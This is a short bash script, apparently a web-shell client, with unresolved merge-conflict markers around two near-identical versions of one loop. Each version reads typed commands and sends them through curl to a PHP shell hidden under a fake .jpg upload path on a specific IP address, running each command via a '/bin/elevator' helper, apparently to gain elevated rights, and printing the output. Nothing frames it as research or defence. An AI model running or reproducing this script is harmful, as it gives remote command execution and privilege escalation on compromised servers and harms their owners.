#!/bin/bash

<<<<<<< HEAD
while :; do read -e -p "# " cmd; history -s "$cmd"; curl -s "http://132.227.89.21/uploads/HDvk2d3MJUY068z0LJiL2PmkJCgaYY7K.jpg/aaa.php?cmd=echo;/bin/elevator '$cmd' 2>%261" | tail -n +35; done
=======
while :; do 
	read -r -e -p "# " cmd; 
	history -s "$cmd"; 
	curl -s "http://132.227.89.21/uploads/HDvk2d3MJUY068z0LJiL2PmkJCgaYY7K.jpg/aaa.php?cmd=echo;/bin/elevator '$cmd' 2>%261" | tail -n +35; 
	done
>>>>>>> 40de17e3456a02afc06fe0e1510d1c4b5f63ec8a
